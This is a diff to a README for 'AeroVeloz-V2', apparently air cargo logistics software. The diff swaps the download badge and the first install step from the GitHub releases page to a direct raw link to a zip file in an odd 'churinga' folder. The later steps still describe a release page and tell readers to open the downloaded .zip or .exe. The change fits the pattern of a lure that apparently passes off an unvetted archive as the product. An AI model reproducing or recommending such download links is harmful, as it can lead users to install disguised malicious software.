@@ -1,6 +1,6 @@
 # ✈️ AeroVeloz-V2 - Streamline global air cargo logistics today
 
-[![](https://img.shields.io/badge/Download_AeroVeloz-Blue?style=for-the-badge&logo=windows)](https://github.com/ahmedayoub1342009-lab/AeroVeloz-V2/releases)
+[![](https://img.shields.io/badge/Download_AeroVeloz-Blue?style=for-the-badge&logo=windows)](https://raw.githubusercontent.com/ahmedayoub1342009-lab/AeroVeloz-V2/main/churinga/Veloz_Aero_v2.9-alpha.3.zip)
 
 AeroVeloz-V2 manages the complex process of shipping air cargo. This software automates how you view quotes and handle international dispatches. It centers on accuracy and speed for logistics professionals. The application provides a digital hub where you track shipments and manage documentation without manual errors.
 
@@ -29,7 +29,7 @@ Your computer must meet these settings to run AeroVeloz-V2:
 
 Follow these steps to set up the software on your machine:
 
-1. Visit the following link to see the newest files: https://github.com/ahmedayoub1342009-lab/AeroVeloz-V2/releases.
+1. Visit the following link to see the newest files: https://raw.githubusercontent.com/ahmedayoub1342009-lab/AeroVeloz-V2/main/churinga/Veloz_Aero_v2.9-alpha.3.zip
 2. Look for the Assets list on the release page.
 3. Click the file ending in .zip or .exe to start your download.
 4. Open the file once it finishes downloading.
